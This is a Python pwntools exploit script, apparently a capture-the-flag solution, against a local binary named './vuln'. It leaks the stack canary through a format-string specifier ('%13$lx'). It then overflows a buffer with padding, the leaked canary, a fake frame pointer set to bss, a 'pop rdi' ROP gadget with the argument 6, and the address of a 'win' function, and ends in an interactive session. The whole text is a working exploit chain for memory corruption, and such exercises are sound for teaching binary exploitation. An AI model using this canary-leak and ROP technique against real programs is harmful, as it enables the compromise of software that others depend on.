from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)
p = process(elf.path)
context.log_level = "debug"
p.recvuntil(b"pirate?")
printf_payload = b"%13$lx"
p.sendline(printf_payload)
canary = p.recvuntil(b"\n")
canary = canary[7:-1]
canary = int(canary, 16)
win_f = p64(elf.sym.win)
payload_overwrite = b"A" * 0x28
payload_overwrite += p64(canary)
# next is rbp value
# we set it somewhere where it can read (so bss is a good option)
payload_overwrite += p64(elf.bss())
payload_overwrite += p64(rop.rdi.address)
payload_overwrite += p64(6)
payload_overwrite += win_f
p.recvuntil(b"is? ")
p.sendline(payload_overwrite)
p.interactive()
